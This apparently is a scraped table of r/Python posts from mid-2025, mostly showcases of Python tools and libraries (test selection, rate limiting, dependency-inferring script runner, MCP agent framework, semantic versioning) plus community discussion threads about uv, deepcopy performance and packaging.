And if you want an easy way to spin up the necessary infrastructure (Kafka, Flink, etc.) on your local machine, check out our Factor House Local project: https://github.com/factorhouse/factorhouse-local

Would love for you to check it out! Let me know what you think."
1mgf5mu,"Snob: Only run tests that matter, saving time and resources.",damien__f1,100,72,2025-08-03 09:37:44,https://www.reddit.com/r/Python/comments/1mgf5mu/snob_only_run_tests_that_matter_saving_time_and/,"**What the project does:**

Most of the time, running your full test suite is a waste of time and resources, since only a portion of the files has changed since your last CI run / deploy.

Snob speeds up your development workflow and reduces CI testing costs dramatically by analyzing your Python project's dependency graph to intelligently select which tests to run based on code changes.

**What the project is not:**

* **Snob doesn‚Äôt predict failures** ‚Äî it selects tests based on static import dependencies.
* It‚Äôs designed to **dramatically reduce the number of tests you run locally**, often skipping \~99% that aren‚Äôt affected by your change.
* It‚Äôs **not a replacement for CI or full regression runs**, but a tool to speed up development in large codebases.
* Naturally, it has limitations ‚Äî it won‚Äôt catch things like dynamic imports, runtime side effects, or other non-explicit dependencies.

**Target audience:**

Python developers.

**Comparison:**

I don't know of any real alternatives to this that aren't testrunner specific, but other tools like Bazel, pytest-testmon, or pants provide similar functionality.

Github: [https://github.com/alexpasmantier/snob](https://github.com/alexpasmantier/snob)"
1mgf38o,[ANN] django‚Äësmart‚Äëratelimit v0.8.0: Circuit Breaker Pattern for Enhanced Reliability,TheCodingTutor,5,0,2025-08-03 09:33:15,https://www.reddit.com/r/Python/comments/1mgf38o/ann_djangosmartratelimit_v080_circuit_breaker/,"**Major Features**

* Circuit Breaker Pattern: automatic failure detection and recovery for all backends
* Exponential Backoff: smart recovery timing that increases delay on repeated failures
* Built‚Äëin by Default: all rate limiting automatically includes circuit breaker protection
* Zero Configuration: works out‚Äëof‚Äëthe‚Äëbox with sensible defaults
* Full Customization: global settings, backend‚Äëspecific config, or disable if needed

**Quality & Compatibility**

* 50+ new tests covering scenarios & edge cases
* Complete mypy compliance and thread‚Äësafe operations
* Minimal performance overhead and zero breaking changes

**Install**  
pip install django‚Äësmart‚Äëratelimit==0.8.0

**Links**  
GitHub ‚Üí¬†[https://github.com/YasserShkeir/django-smart-ratelimit](https://github.com/YasserShkeir/django-smart-ratelimit)

Looking forward to your feedback and real‚Äëworld performance stories!"
1mg8thr,autopep723: Run Python scripts with automatic dependency management,Effective-Bug4024,0,6,2025-08-03 03:10:22,https://www.reddit.com/r/Python/comments/1mg8thr/autopep723_run_python_scripts_with_automatic/,"I have created a wrapper around ‚Äúuv‚Äù that eliminates the remaining friction for running Python scripts with dependencies. It's ideal for quick experiments and sharing code snippets.

## What My Project Does

`autopep723` is a tiny wrapper around `uv run` that automatically detects and manages third-party dependencies in Python scripts. Just run:

```bash
uvx autopep723 script.py
```

No `--with` flags, no manual dependency lists, no setup. It parses your imports using AST, maps them to the correct package names (handles tricky cases like `import PIL` ‚Üí `pillow`), and runs your script in a clean environment.

Try it: `uvx autopep723 https://gist.githubusercontent.com/mgaitan/7052bbe00c2cc88f8771b576c36665ae/raw/cbaa289ef7712b5f4c5a55316cce4269f5645c20/autopep723_rocks.py`

**Bonus**: Use it as a shebang for truly portable scripts:

```python
#!/usr/bin/env -S uvx autopep723
import requests
import pandas as pd
# Your code here...
```

## Target Audience

- Developers who want to quickly test/share Python scripts without setup friction
- Anyone tired of the ""install dependencies first"" dance for simple experiments
- People sharing code snippets that should ""just work"" on any machine with uv installed

## Comparison

Unlike manual approaches:

- **vs uv run --with**: No need to remember/specify dependencies manually
- **vs PEP 723 headers**: No need to write dependency metadata by hand
- **vs pip install**: No environment pollution, each script runs in isolation
- **vs pipx/poetry**: Zero configuration, works with any Python script immediately

The goal is making Python scripts as easy to run as possible. 

---

**Links:**
- üìù [Blog Post](https://mgaitan.github.io/en/posts/automatic-dependencies-management-python-scripts-autopep723/)
- üì¶ [GitHub Repo](https://github.com/mgaitan/autopep723)
- üìñ [Documentation](https://autopep723.readthedocs.io/en/latest/)

"
1mg79rn,Smart Notes - AI-powered note-taking app with Google Gemini integration**,Soft-Western-6433,0,1,2025-08-03 01:50:26,https://www.reddit.com/r/Python/comments/1mg79rn/smart_notes_aipowered_notetaking_app_with_google/,"\## What My Project Does

Smart Notes is a modern desktop note-taking application built with Python tkinter that integrates Google Gemini AI for intelligent writing assistance. It provides a clean, Material Design-inspired interface for creating, organizing, and searching notes while offering AI-powered content enhancement, brainstorming, and writing help.



Key features:

\- Create and manage notes with a clean, distraction-free interface

\- AI-powered writing assistance via Google Gemini API

\- Fast full-text search across all notes

\- Modern dark/light theme system (Material Design inspired)

\- Secure local API key management with encryption

\- Export notes to text files

\- Keyboard shortcuts for power users

\- Built-in tutorial and help system



\## Target Audience

This project is designed for \*\*production use\*\* by:

\- \*\*Students and researchers\*\* who need AI assistance with note-taking and writing

\- \*\*Content creators and writers\*\* looking for AI brainstorming and editing help

\- \*\*Professionals\*\* who want a local, secure alternative to cloud-based note apps

\- \*\*Privacy-conscious users\*\* who prefer local data storage over cloud services

\- \*\*Python developers\*\* interested in tkinter GUI development and AI integration



The application is stable, fully functional, and ready for daily use. It's not a toy project - it's a complete productivity tool.



\## Comparison

Smart Notes differs from existing alternatives in several key ways:



\*\*vs. Notion/Obsidian:\*\*

\- Lightweight desktop app (no web browser required)

\- Direct AI integration without plugins

\- Simple, focused interface (no complex block systems)

\- Local-first with optional AI features



\*\*vs. AI writing tools (ChatGPT web, Claude):\*\*

\- Integrated note-taking + AI in one app

\- Persistent note storage and organization

\- Offline note access (AI requires internet)

\- Privacy-focused local storage



\*\*vs. Traditional note apps (Notepad++, gedit):\*\*

\- Built-in AI writing assistance

\- Modern, themed interface

\- Advanced search capabilities

\- Structured note organization



\*\*vs. Other Python GUI projects:\*\*

\- Production-ready with professional design

\- Real-world AI API integration

\- Complete theming system implementation

\- Comprehensive error handling and user experience



\## Technical Details

\- \*\*Language:\*\* Python 3.7+

\- \*\*GUI Framework:\*\* tkinter (cross-platform)

\- \*\*AI Integration:\*\* Google Generative AI SDK

\- \*\*Data Storage:\*\* Local JSON files

\- \*\*License:\*\* GPL v3 (open source)

\- \*\*Platform:\*\* Windows, macOS, Linux



\## Installation

git clone [https://github.com/rar12455/smart-notes.git](https://github.com/rar12455/smart-notes.git)

cd smart-notes

pip install -r requirements.txt

python [smartnotes.py](http://smartnotes.py)



  
"
1mg61fl,I built webpath to eliminate API boilerplate,papersashimi,19,18,2025-08-03 00:47:04,https://www.reddit.com/r/Python/comments/1mg61fl/i_built_webpath_to_eliminate_api_boilerplate/,"I built webpath for myself. I did showcase it here last time and got some feedback. So i implemented the feedback. Anyway, it uses `httpx` and `jmespath` under the hood.

So, why not just use `requests` or `httpx` \+ `jmespath` separately?

You can, but this removes all the long boilerplate code that you need to write in your entire workflow.

Instead of manually performing separate steps, you chain everything into a command:

1. Build a URL with `/` just like `pathlib`.
2. Make your request.
3. Query the nested JSON from the res object.

Before (more procedural, stpe 1 do this, step 2 do that, step 3 do blah blah blah)

    response = httpx.get(""https://api.github.com/repos/duriantaco/webpath"") 
    
    response.raise_for_status()
    data = response.json() 
    owner = jmespath.search(""owner.login"", data) 
    print(f""Owner: {owner}"")

After (more declarative, state your intent, what you want)

    owner = Client(""https://api.github.com"").get(""repos"", ""duriantaco"", ""webpath"").find(""owner.login"") 
    
    print(f""Owner: {owner}"")

It handles other things like auto-pagination and caching also. Basically, i wrote this for myself to stop writing plumbing code and focus on the data.

Less boilerplate.

# Target audience

Anyone dealing with apis

If you like to contribute or features, do lemme know. You can read the readme in the repo for more details. If you found it useful please star it. If you like to contribute again please let me know.

**GitHub Repo:** [`https://github.com/duriantaco/webpath`](https://github.com/duriantaco/webpath)"
1mg5wxg,Why python got so popular despite being slow?,Ash_ketchup18,0,27,2025-08-03 00:40:46,https://www.reddit.com/r/Python/comments/1mg5wxg/why_python_got_so_popular_despite_being_slow/,"So i just got a random thought: why python got so much popular despite being slower than the other already popular languages like C when  it got launched? As there were more hardware limitations at that time so i guess it made more sense for them to go with the faster lang. I know there are different contexts depending on which lang to go with but I am talking about when it was not established as a mainstream but was in a transition towards that. Or am I  wrong? I have a few speculations:

1. Python got famous because it was simple and easy and they preferred that over speed. (Also why would they have preferred that? I mean there are/were many geniuses who would not have any problem coding in a little more ""harder"" lang if it gave them significant speed)

2. It didn't got famous at first but slowly and gradually as its community grew (I still wonder who were those people though).

"
1mg53kt,Sunday Daily Thread: What's everyone working on this week?,AutoModerator,1,5,2025-08-03 00:00:34,https://www.reddit.com/r/Python/comments/1mg53kt/sunday_daily_thread_whats_everyone_working_on/,"# Weekly Thread: What's Everyone Working On This Week? üõ†Ô∏è

Hello /r/Python! It's time to share what you've been working on! Whether it's a work-in-progress, a completed masterpiece, or just a rough idea, let us know what you're up to!

## How it Works:

1. **Show & Tell**: Share your current projects, completed works, or future ideas.
2. **Discuss**: Get feedback, find collaborators, or just chat about your project.
3. **Inspire**: Your project might inspire someone else, just as you might get inspired here.

## Guidelines:

* Feel free to include as many details as you'd like. Code snippets, screenshots, and links are all welcome.
* Whether it's your job, your hobby, or your passion project, all Python-related work is welcome here.

## Example Shares:

1. **Machine Learning Model**: Working on a ML model to predict stock prices. Just cracked a 90% accuracy rate!
2. **Web Scraping**: Built a script to scrape and analyze news articles. It's helped me understand media bias better.
3. **Automation**: Automated my home lighting with Python and Raspberry Pi. My life has never been easier!

Let's build and grow together! Share your journey and learn from others. Happy coding! üåü"
1mg3vl3,show map made on python,None,0,2,2025-08-02 23:02:08,https://www.reddit.com/r/Python/comments/1mg3vl3/show_map_made_on_python/,"Heyy, so I am working on a research poster and I coded an interactive map for my research that I‚Äôd like to show, so the only way to show it seems to be is adding a qr code to the map link, do I get a map link that would work all the time? Without needing to log in to jupyter or any website. I know there are other subreddits to post these things on but seems like the posting process takes time on the other subreddits and I don‚Äôt have time kekejdbavakaoanabsbsb"
1mg2abc,"Organizicate ‚Äì A smart Python/Tkinter file organizer app (fast, open-source, advanced.)",anAmok,0,7,2025-08-02 21:49:11,https://www.reddit.com/r/Python/comments/1mg2abc/organizicate_a_smart_pythontkinter_file_organizer/,"

Yo! This is Kero. üëã

I built a desktop app called **Organizicate** to help clean up messy folders.  
It‚Äôs written in Python using `tkinter`, `ttkbootstrap`, `tkinterdnd2`, and `pystray`.

# ‚úÖ What My Project Does

Organizicate is a **drag-and-drop file and folder organizer for Windows**. It sorts your files into customizable categories based on their extensions, with features like:

* Full undo history (not just one step)
* Exclusion rules (skip specific files/folders)
* Pie chart summaries
* 4 smart organization modes
* 15+ modern light/dark themes
* System tray support
* ‚ÄúShow Changes‚Äù preview before applying

It‚Äôs fully local (no network), standalone (just unzip and run), and open-source under the MIT license.

# üéØ Target Audience

This project is mainly for:

* **Developers or students** with chaotic download folders
* **Windows users** who want a quick way to sort stuff without scripting
* Anyone who likes visually clean apps with drag-and-drop support

It‚Äôs stable for daily use but still marked **Beta** until I finish polishing edge cases and usability feedback.

# üîç Comparison to Alternatives

Compared to basic file organization scripts or heavy-duty apps:

* üìÇ It **requires no setup or install** ‚Äî unzip and go
* üß† It **auto-categorizes** based on file types, with undo history
* üñ±Ô∏è It has a **modern UI** with drag-and-drop, not just CLI or batch scripts
* üé® It offers **theme switching and system tray support**, which most scripts lack

Think of it as a middle ground: more power than basic scripts, but lighter and friendlier than complex commercial organizers.

üîó **GitHub**: [https://github.com/thatAmok/organizicate](https://github.com/thatAmok/organizicate)  
üñºÔ∏è [Screenshot](https://github.com/user-attachments/assets/f2f1af11-27e4-4f35-b70b-62dda3a423c9)  
üì¨ Feedback welcome: Issues, PRs, feature ideas ‚Äî all appreciated!

Thanks for reading, and I hope it helps someone out there get a bit more organized üòÑ"
1mfxk21,Elusionü¶é v3.13.2 is ready to read ALL files from folders üìÅ (Local and SharePoint),DataBora,0,1,2025-08-02 18:25:18,https://www.reddit.com/r/Python/comments/1mfxk21/elusion_v3132_is_ready_to_read_all_files_from/,"Newest Elusion release has multiple new features, 2 of those being:

1. LOADING data from LOCAL FOLDER into DataFrame
2. LOADING data from SharePoint FOLDER into DataFrame

**Target audience:**

What this features do for you:

# - Automatically loads and combines multiple files from a folder

# - Handles schema compatibility and column reordering automatically

# - Uses UNION ALL to combine all files (keeping all rows)

# - Supports CSV, EXCEL, JSON, and PARQUET files

# 3 arguments needed:¬†Folder Path,¬†File Extensions Filter (Optional),¬†Result Alias

**What my project does:**

Example usage for **Local Folder**:

    // Load all supported files from folder
    let combined_data = CustomDataFrame::load_folder(
       ""C:\\BorivojGrujicic\\RUST\\Elusion\\SalesReports"",
       None, // Load all supported file types (csv, xlsx, json, parquet)
       ""combined_sales_data""
    ).await?;
    
    // Load only specific file types
    let csv_excel_data = CustomDataFrame::load_folder(
       ""C:\\BorivojGrujicic\\RUST\\Elusion\\SalesReports"", 
       Some(vec![""csv"", ""xlsx""]), // Only load CSV and Excel files
       ""filtered_data""
    ).await?;

Example usage for **SharePoint Folder**:  
**\*\*\*** To be able to load data from SharePoint Folder you need to be logged in with AzureCLI localy.

    let dataframes = CustomDataFrame::load_folder_from_sharepoint(
        ""your-tenant-id"",
        ""your-client-id"", 
        ""http://companyname.sharepoint.com/sites/SiteName"", 
        ""Shared Documents/MainFolder/SubFolder"",
        None, // None will read any file type, or you can filter by extension vec![""xlsx"", ""csv""]
        ""combined_data"" //dataframe alias
    ).await?;
    
    dataframes.display().await?;

There are couple more useful functions like:  
**load\_folder\_with\_filename\_column()** for Local Folder,  
**load\_folder\_from\_sharepoint\_with\_filename\_column()** for SharePoint folder  
which automatically add additional column with file name for each row of that file.  
This is great for Time based Analysis if file names have date in their name.

To learn more about these functions, and other ones, check out README file in repo: [https://github.com/DataBora/elusion](https://github.com/DataBora/elusion)"
1mfpy4d,Http server from scratch on python.,fuckkk10,0,0,2025-08-02 12:59:18,https://www.reddit.com/r/Python/comments/1mfpy4d/http_server_from_scratch_on_python/,"I write my own HTTP server on pure python using socket programming.

üöÄ Live Rocket Web Framework A lightweight, production-ready web framework built from scratch in pure Python. ‚ú® Features Raw Socket HTTP Server - Custom HTTP/1.1 implementation Flask-Style Routing - Dynamic URLs with type conversion WSGI Compliant - Production server compatibility Middleware System - Global and route-specific support Template Engine - Built-in templating system and ORM system you can use any databases.

üöÄ Quick Start from 

live_rocket import 
live_rocketapp = live_rocket()
@app.get('/')
def home(req, res): ¬†¬†¬†
    ¬†res.send(""Hello, Live Rocket!"") @app.get('/users/<int:user_id>')
def get_user(req, res, user_id): ¬†¬†¬†¬†
     res.send(f""User ID: {user_id}"") app.run(debug=True)


Check it at : 
https://github.com/Bhaumik0/Live-rocket

"
1mfp8iu,gh-action: mkdocs gh-deploy: Default for --use-directory-urls changed?!,j_hermann,8,0,2025-08-02 12:22:47,https://www.reddit.com/r/Python/comments/1mfp8iu/ghaction_mkdocs_ghdeploy_default_for/,"I had to apply this change to my call publishing a mkdocs-material site.

    -      - run: mkdocs gh-deploy --force
    +      - run: mkdocs gh-deploy --config-file mkdocs.yml --force --use-directory-urls  

Seems other projects are affected too, including *Material for Mkdocs* itself.

[https://squidfunk.github.io/mkdocs-material/plugins/offline.html](https://squidfunk.github.io/mkdocs-material/plugins/offline.html)  
vs  
[https://squidfunk.github.io/mkdocs-material/plugins/offline/](https://squidfunk.github.io/mkdocs-material/plugins/offline/)"
1mfgydy,"Sleek blog engine where posts are written in Markdown (Flask, markdown, dominate, etc.)",crazywillbear,25,6,2025-08-02 03:57:14,https://www.reddit.com/r/Python/comments/1mfgydy/sleek_blog_engine_where_posts_are_written_in/,"The repo is [https://github.com/CrazyWillBear/blogman](https://github.com/CrazyWillBear/blogman), and it's a project I've been working on for a couple months. It's nothing crazy but definitely a lightweight and sleek blog engine for those wanting to self-publish their writing. I'm a junior in college so don't be too hard on me!

Here's what it does: uses \`dominate\` to render HTML and \`markdown\` to convert markdown files into HTML. It also caches blog posts so they aren't re-rendered every time a visitor loads it.

My target audience is bloggers who want a lightweight and easy to use blog engine that they can host on their own."
1mfd3ww,"But really, why use ‚Äòuv‚Äô?",kingfuriousd,455,232,2025-08-02 00:41:11,https://www.reddit.com/r/Python/comments/1mfd3ww/but_really_why_use_uv/,"Overall, I think [uv](https://github.com/astral-sh/uv) does a really good job at accomplishing its goal of being a net improvement on Python‚Äôs tooling. It works well and is fast.

That said, as a consumer of Python packages, I interact with uv maybe 2-3 times per month. Otherwise, I‚Äôm using my already-existing Python environments.

So, the questions I have are: Does the value provided by uv justify having another tool installed on my system? Why not just stick with Python tooling and accept ‚Äòpip‚Äô or ‚Äòvenv‚Äô will be slightly slower? What am I missing here?

Edit: Thanks to some really insightful comments, I‚Äôm convinced that uv is worthwhile - even as a dev who doesn‚Äôt manage my project‚Äôs build process."
1mfc9h3,Saturday Daily Thread: Resource Request and Sharing! Daily Thread,AutoModerator,3,0,2025-08-02 00:00:32,https://www.reddit.com/r/Python/comments/1mfc9h3/saturday_daily_thread_resource_request_and/,"# Weekly Thread: Resource Request and Sharing üìö

Stumbled upon a useful Python resource? Or are you looking for a guide on a specific topic? Welcome to the Resource Request and Sharing thread!

## How it Works:

1. **Request**: Can't find a resource on a particular topic? Ask here!
2. **Share**: Found something useful? Share it with the community.
3. **Review**: Give or get opinions on Python resources you've used.

## Guidelines:

* Please include the type of resource (e.g., book, video, article) and the topic.
* Always be respectful when reviewing someone else's shared resource.

## Example Shares:

1. **Book**: [""Fluent Python""](https://www.amazon.com/Fluent-Python-Concise-Effective-Programming/dp/1491946008) \- Great for understanding Pythonic idioms.
2. **Video**: [Python Data Structures](https://www.youtube.com/watch?v=pkYVOmU3MgA) \- Excellent overview of Python's built-in data structures.
3. **Article**: [Understanding Python Decorators](https://realpython.com/primer-on-python-decorators/) \- A deep dive into decorators.

## Example Requests:

1. **Looking for**: Video tutorials on web scraping with Python.
2. **Need**: Book recommendations for Python machine learning.

Share the knowledge, enrich the community. Happy learning! üåü"
1mf7edh,Best resources to master Django !,New_Bat_9086,2,8,2025-08-01 20:30:47,https://www.reddit.com/r/Python/comments/1mf7edh/best_resources_to_master_django/,"I have a good knowledge in Python programming language, but I have never used its web framework Django.

I have experience with Java Spring, Node.js, React, and next.js, but now want to discover Django for app/web development. 

I wonder if anyone can refer me to any good resources to learn more on Django.

And would you consider it as a good alternative for app/web development? And why?"
1mf6agb,Problem with Fastly CDN serving PyPi packages?,cerulean47,0,6,2025-08-01 19:46:35,https://www.reddit.com/r/Python/comments/1mf6agb/problem_with_fastly_cdn_serving_pypi_packages/,"Out of the blue, failing to install some Python packages today, seemingly due to a certificate mismatch with the Fastly CDN.

I tried added docling to my pyproject.toml using `uv add` but was blocked. Similar warnings as this:

    ‚ùØ uv sync --python 3.13
    ‚†º lxml==6.0.0                                                                                                                                                                                                                          error: Failed to fetch: `https://files.pythonhosted.org/packages/79/21/6e7c060822a3c954ff085e5e1b94b4a25757c06529eac91e550f3f5cd8b8/lxml-6.0.0-cp313-cp313-macosx_10_13_universal2.whl.metadata`
      Caused by: Request failed after 3 retries
      Caused by: error sending request for url (https://files.pythonhosted.org/packages/79/21/6e7c060822a3c954ff085e5e1b94b4a25757c06529eac91e550f3f5cd8b8/lxml-6.0.0-cp313-cp313-macosx_10_13_universal2.whl.metadata)
      Caused by: client error (Connect)
      Caused by: invalid peer certificate: certificate not valid for name ""files.pythonhosted.org""; certificate is only valid for DnsName(""default.ssl.fastly.net""), DnsName(""*.hosts.fastly.net"") or DnsName(""*.fastly.com"")

1. PyPI uses Fastly as their CDN - files.pythonhosted.org resolves to dualstack.python.map.fastly.net

2. Certificate mismatch - The Fastly server is presenting a certificate for default.ssl.fastly.net instead of the expected files.pythonhosted.org or python.map.fastly.net

Anyone else seeing same?"
1mf0cnh,Pip 25.2: Resumable Downloads By Default,zurtex,68,3,2025-08-01 16:00:28,https://www.reddit.com/r/Python/comments/1mf0cnh/pip_252_resumable_downloads_by_default/,"This week pip 25.2 has been released, it's a small release but the biggest change is resumable downloads, introduced in 25.1, have been enabled by default.

Resumable downloads will retry the download at the point a connection was disconnected within the same install or download command (though not across multiple commands). This has been a long standing feature request for users which have slow and/or unreliable internet, especially now some packages are multi-GB in size.

Richard, one of the pip maintainers, has again done an excellent write up: [https://ichard26.github.io/blog/2025/07/whats-new-in-pip-25.2/](https://ichard26.github.io/blog/2025/07/whats-new-in-pip-25.2/)

The full changelog is here: [https://github.com/pypa/pip/blob/main/NEWS.rst#252-2025-07-30](https://github.com/pypa/pip/blob/main/NEWS.rst#252-2025-07-30)

One thing not obvious from either is the upgrade to resolvelib 1.2.0 improves most pathological resolutions significantly, speeding up the time for pip to find a valid resolution for the requirements. There is more work to do here, I will continue to try and find improvements in my spare time."
1mf0cih,MCP-Agent - Python Open Source Framework for building AI agents with native MCP support,lastbyteai,8,1,2025-08-01 16:00:20,https://www.reddit.com/r/Python/comments/1mf0cih/mcpagent_python_open_source_framework_for/,"Hi [r/Python](https://www.reddit.com/r/Python/) \- I wanted to share something that my team and I built for agent builders using Python.

We've spent the last 6 months working on [MCP-Agent](https://github.com/lastmile-ai/mcp-agent) \- an open source Python framework for building AI agents using the Model Context Protocol (MCP) for tool calls and structured agent-to-agent communication and orchestration.

**Model Context Protocol (MCP)** is a protocol that standardizes how LLMs interact with tools, memory, and prompts. This allows you to connect to Slack and Github, which means you can now ask an LLM to summarize all your Github issues, prioritize them by urgency, and post it on Slack.

**What does our project do?**

[MCP-Agent](https://github.com/lastmile-ai/mcp-agent) is a developer-friendly, open-source framework for building and orchestrating **AI agents with MCP** as the core communication protocol. It is a simple but powerful library built with the fundamental building blocks for agentic systems outlined by [Anthropic's Building effective agents](https://www.anthropic.com/engineering/building-effective-agents) post.

This makes it easy for Python developers to create workflows like:

* *Supabase to github typesync agent*
* *Agents with chat-based browser usage*
* *Deep research agents*

**Target audience**

We've designed this library with production in mind, with features like:

* Integration into Temporal for long-running agentic workflows
* OTEL telemetry to connect to your own observability tools
* YAML-based configurations for defining connections to MCP servers
* MCP-Agents can be exposed as MCP servers, which means MCP clients can call MCP-Agents

**How does this compare with other Agentic Frameworks?**

At its core, we designed the agent framework to use MCP as the core communication protocol. We believe that tool calls **and agents** should be exposed as MCP servers enabling a rich ecosystem of integrations. This is a core difference with frameworks like a2a.

Second, we‚Äôve been opinionated about *not* overextending the framework. Many existing agentic frameworks become overly complex: *customized internal data structures, proprietary observability formats/tools,* and *tangled orchestration logic*. We debated building our own, and ultimately chose to create a simple, focused framework and open source it for others facing the same trade-offs.

Would love to hear the community's feedback!

[https://github.com/lastmile-ai/mcp-agent](https://github.com/lastmile-ai/mcp-agent)

"
1mevs3i,Forget metaclasses; Python‚Äôs `__init_subclass__` is all you really need,Extension-Ad8670,245,60,2025-08-01 12:56:57,https://www.reddit.com/r/Python/comments/1mevs3i/forget_metaclasses_pythons_init_subclass_is_all/,"Think you need a metaclass? You probably just need `__init_subclass__;` Python‚Äôs underused subclass hook.

Most people reach for metaclasses when customizing subclass behaviour. But in many cases, `__init_subclass__` is *exactly* what you need; and it‚Äôs been built into Python since **3.6**.

**What is** `__init_subclass__`\*\*?\*\*

It‚Äôs a hook that gets automatically called *on the base class* whenever a new subclass is defined. Think of it like a class-level `__init__`, but for **subclassing;** not instancing.

# Why use it?

* Validate or register subclasses
* Enforce class-level interfaces or attributes
* Automatically inject or modify subclass properties
* Avoid the complexity of full metaclasses

# Example: Plugin Auto-Registration

    class PluginBase:
        plugins = []
    
        def __init_subclass__(cls, **kwargs):
            super().__init_subclass__(**kwargs)
            print(f""Registering: {cls.__name__}"")
            PluginBase.plugins.append(cls)
    
    class PluginA(PluginBase): pass
    class PluginB(PluginBase): pass
    
    print(PluginBase.plugins)

**Output:**

    Registering: PluginA
    Registering: PluginB
    [<class '__main__.PluginA'>, <class '__main__.PluginB'>]

#  Common Misconceptions

* `__init_subclass__` runs on the **base**, not the child.
* It‚Äôs **not inherited** unless explicitly defined in child classes.
* It‚Äôs perfect for **plugin systems**, **framework internals**, **validation**, and more.

#  Bonus: Enforce an Interface at Definition Time

    class RequiresFoo:
        def __init_subclass__(cls):
            super().__init_subclass__()
            if 'foo' not in cls.__dict__:
                raise TypeError(f""{cls.__name__} must define a 'foo' method"")
    
    class Good(RequiresFoo):
        def foo(self): pass
    
    class Bad(RequiresFoo):
        pass  # Raises TypeError: Bad must define a 'foo' method

You get clean, declarative control over class behaviour; **no metaclasses required**, no magic tricks, just good old Pythonic power.

How are *you* using `__init_subclass__`? Let‚Äôs share some elegant subclass hacks

\#pythontricks #oop"
1mesqaj,I built an open-source code visualizer,alex7885,12,8,2025-08-01 10:18:58,https://www.reddit.com/r/Python/comments/1mesqaj/i_built_an_opensource_code_visualizer/,"I built CodeBoarding, an open-source (fully free) project that can generate recursive interactive diagrams of large Python codebases.

## What My Project Does

It combines static analysis and LLMs to avoid hallucations and keep the diagrams accurate. You can click from high-level structure down to function-level details.

## Comparison

I built this after my experience trying to generate this using tools like cursor and gitingest + LLMs, but always running into context limit issues/hallucinated diagrams for larger codebases.

## Target Audience

Visual learners who wants to interact with diagrams when getting to know a codebase, or to explain your own code to people who are not familiar.

Github: https://github.com/CodeBoarding/CodeBoarding

Examples: https://github.com/CodeBoarding/GeneratedOnBoardings

I launched this Wednesday and would so appreciate any suggestions on what to add next to the roadmap :)"
1meputs,Facial recognition fail,None,0,2,2025-08-01 07:15:39,https://www.reddit.com/r/Python/comments/1meputs/facial_recognition_fail/,"I'm building this facial recognition model with attendance management system for my college project will later on Integrate raspberry pi into it. But the model doesn't work. I've tried gpt solution, tried downloading vs tools, cmake and what not but Dlib is always giving errors. Also when I tried installing Dlib from a whl while it gave error saying image format should be RGB or 8bit something. Someone who knows anything about this or openCV let me know."
1mendp9,is learning flet a python wrapper for flutter a smart move in 2025,Putrid_Set_3210,0,9,2025-08-01 04:45:54,https://www.reddit.com/r/Python/comments/1mendp9/is_learning_flet_a_python_wrapper_for_flutter_a/,"Was wondering whether flet can currently be used to create modern mobile apps,and if any one here has managed to run a flet app on an android or os device"
1mehrc0,Why Python's deepcopy() is surprisingly slow (and better alternatives),ml_guy1,280,66,2025-08-01 00:06:18,https://www.reddit.com/r/Python/comments/1mehrc0/why_pythons_deepcopy_is_surprisingly_slow_and/,"I've been running into performance bottlenecks in the wild where \`copy.deepcopy()\` was the bottleneck. After digging into it, I discovered that deepcopy can actually be slower than even serializing and deserializing with pickle or json in many cases!

I wrote up my findings on why this happens and some practical alternatives that can give you significant performance improvements: [https://www.codeflash.ai/post/why-pythons-deepcopy-can-be-so-slow-and-how-to-avoid-it](https://www.codeflash.ai/post/why-pythons-deepcopy-can-be-so-slow-and-how-to-avoid-it)

\*\*TL;DR:\*\* deepcopy's recursive approach and safety checks create memory overhead that often isn't worth it. The post covers when to use alternatives like shallow copy + manual handling, pickle round-trips, or restructuring your code to avoid copying altogether.

Has anyone else run into this? Curious to hear about other performance gotchas you've discovered in commonly-used Python functions."
1mehndi,Friday Daily Thread: r/Python Meta and Free-Talk Fridays,AutoModerator,1,0,2025-08-01 00:01:23,https://www.reddit.com/r/Python/comments/1mehndi/friday_daily_thread_rpython_meta_and_freetalk/,"# Weekly Thread: Meta Discussions and Free Talk Friday üéôÔ∏è

Welcome to Free Talk Friday on /r/Python! This is the place to discuss the r/Python community (meta discussions), Python news, projects, or anything else Python-related!

## How it Works:

1. **Open Mic**: Share your thoughts, questions, or anything you'd like related to Python or the community.
2. **Community Pulse**: Discuss what you feel is working well or what could be improved in the /r/python community.
3. **News & Updates**: Keep up-to-date with the latest in Python and share any news you find interesting.

## Guidelines:

* All topics should be related to Python or the /r/python community.
* Be respectful and follow Reddit's [Code of Conduct](https://www.redditinc.com/policies/content-policy).

## Example Topics:

1. **New Python Release**: What do you think about the new features in Python 3.11?
2. **Community Events**: Any Python meetups or webinars coming up?
3. **Learning Resources**: Found a great Python tutorial? Share it here!
4. **Job Market**: How has Python impacted your career?
5. **Hot Takes**: Got a controversial Python opinion? Let's hear it!
6. **Community Ideas**: Something you'd like to see us do? tell us.

Let's keep the conversation going. Happy discussing! üåü"
1meeftd,Compilation vs Bundling: The Real Differences Between Nuitka and PyInstaller,DivineSentry,48,6,2025-07-31 21:43:44,https://www.reddit.com/r/Python/comments/1meeftd/compilation_vs_bundling_the_real_differences/,"[https://krrt7.dev/en/blog/nuitka-vs-pyinstaller](https://krrt7.dev/en/blog/nuitka-vs-pyinstaller)

  
Hi folks, As a contributor to Nuitka, I‚Äôm often asked how it compares to PyInstaller. Both tools address the critical need of packaging Python applications as standalone executables, but their approaches differ fundamentally, so I wrote my first blog in order to cover the topic! let me know if you have any feedback"
1me9egq,comver: Commit-only semantic versioning - highly configurable (path/author filtering) and tag-free,szymonmaszke,6,0,2025-07-31 18:28:41,https://www.reddit.com/r/Python/comments/1me9egq/comver_commitonly_semantic_versioning_highly/,"Hey, created a variation of semantic versioning which calculates the version directly from commits (no tags are created or used during the calculation).

Project link: https://github.com/open-nudge/comver

It can also be used with other languages, but as it's written in Python and quite Python centric (e.g. integration with hatch) I think it's fitting here.

## What it does?

It might not be as straightforward, but will try to be brief, yet clear (please ask clarifying questions if you have some in the comments, thank you!

1.	‚Å†Calculates software versions as described in semantic versioning (`MAJOR.MINOR.PATCH`) based on commit prefixes (`fix`, `feat`, `fix!/feat!` or `BREAKING CHANGE` in the body).

2.	‚Å†Unlike other tools it does not use tags at all (more about it here: https://open-nudge.github.io/comver/latest/tutorials/why/)

3.	‚Å†Highly customizable (filtering commits based on author, path changed or the commit message itself)

4.	‚Å†Can be used as a standalone or integrates with package managers like `hatch`), `pdm` or `uv`

## Why?

1.	‚Å†Teams may avoid bumping the major version due to the perceived weight of the change. Double versioning scheme might be a solution - one version for technical changes, another for public releases (e.g. `4.27.3` corresponding to second announcement, say `2`).

